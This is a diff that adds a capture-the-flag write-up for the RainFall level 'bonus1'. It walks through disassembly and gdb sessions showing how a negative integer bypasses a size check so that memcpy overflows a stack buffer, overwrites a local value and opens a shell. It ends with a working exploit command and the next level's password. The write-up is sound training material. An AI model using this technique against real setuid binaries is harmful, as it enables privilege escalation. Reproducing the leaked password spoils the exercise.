@@ -1,0 +1,87 @@
+# Program behaviour
+* takes 2 parameters
+* 1st parameter is converted by atoi and then compared to 9
+   * if superior than 9 stop the program
+   * else memcpy n bytes from the second program parameter to local buffer. n being `atoi(first parameter)`
+* it then compare the result of atoi to 0x574f4c46
+   * if equal, run `execl("/bin/sh", "sh")`
+
+The ASM part that we want to access is:
+```
+   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>           ; memcpy(buffer, argv[2], atoi(argv[1]))
+   0x08048478 <+84>:    cmp    DWORD PTR [esp+0x3c],0x574f4c46
+   0x08048480 <+92>:    jne    0x804849e <main+122>
+   0x08048482 <+94>:    mov    DWORD PTR [esp+0x8],0x0
+   0x0804848a <+102>:   mov    DWORD PTR [esp+0x4],0x8048580    ; "sh"
+   0x08048492 <+110>:   mov    DWORD PTR [esp],0x8048583        ; "bin/sh"
+   0x08048499 <+117>:   call   0x8048350 <execl@plt>
+```
+This would allow use to get a shell access with bonus1 permission
+We need to have the local variable `esp+0x3c` to be equal to 0x574f4c46
+Earlier in the code we can see that
+```
+   0x08048438 <+20>:    call   0x8048360 <atoi@plt>             ; atoi on argv[1]
+   0x0804843d <+25>:    mov    DWORD PTR [esp+0x3c],eax         ; store result
+   ...
+   0x0804844f <+43>:    mov    eax,DWORD PTR [esp+0x3c]         ; load atoi result
+   0x08048453 <+47>:    lea    ecx,[eax*4+0x0]
+   ...
+```
+esp+0x3c is where is stored the result of atoi. It is then multiplied by 4 and then passed to memcpy as number of bytes to copy.
+
+```
+   0x08048464 <+64>:    lea    eax,[esp+0x14]
+   0x08048468 <+68>:    mov    DWORD PTR [esp+0x8],ecx          ; result of atoi * 4
+   0x0804846c <+72>:    mov    DWORD PTR [esp+0x4],edx
+   0x08048470 <+76>:    mov    DWORD PTR [esp],eax
+   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>           ; memcpy(buffer, argv[2], atoi(argv[1]))
+```
+We can see that the buffer used for memcpy is at esp+0x14
+We need to calculate how many bytes we need to write in order to overwrite the value at esp+0x3c
+0x3c-0x14=60-20=40
+We need to write 40 bytes then 4 more to overwrite the value stored at 0x3c
+However
+```
+   0x08048441 <+29>:    cmp    DWORD PTR [esp+0x3c],0x9         ; compare result with 9
+```
+This prevents us to pass first parameter superior than 9... But what about negative values?
+We want to know what happens when
+```
+   0x0804844f <+43>:    mov    eax,DWORD PTR [esp+0x3c] ; load atoi result
+   0x08048453 <+47>:    lea    ecx,[eax*4+0x0]
+```
+is done with a negative value. Let's put a breakpoint at the next instruction and print our ecx register. Let's try with min max (-2147483648)
+```
+(gdb) r -2147483648
+Starting program: /home/user/bonus1/bonus1 -2147483648
+
+Breakpoint 1, 0x0804845a in main ()
+(gdb) i r ecx
+ecx            0x0      0
+```
+This is interesting... Let's try with a slightly greater value
+```
+(gdb) r -2147483640
+Starting program: /home/user/bonus1/bonus1 -2147483640
+
+Breakpoint 1, 0x0804845a in main ()
+(gdb) i r ecx
+ecx            0x20     32
+```
+That's something we want but not the exact value. We want a value of 44, can we tweak it to be equal to that?
+```
+(gdb) r -2147483637
+Starting program: /home/user/bonus1/bonus1 -2147483637
+
+Breakpoint 1, 0x0804845a in main ()
+(gdb) i r ecx
+ecx            0x2c     44
+```
+That's perfect.
+Now, we want to be overwrite the value at 0x3c by 0x574f4c46. What we need to do is to send as second parameter a dummy load of 40 bytes and then 4 bytes containing 0x574f4c46
+
+```
+bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x57\x4f\x4c\x46"[::-1]')
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+```
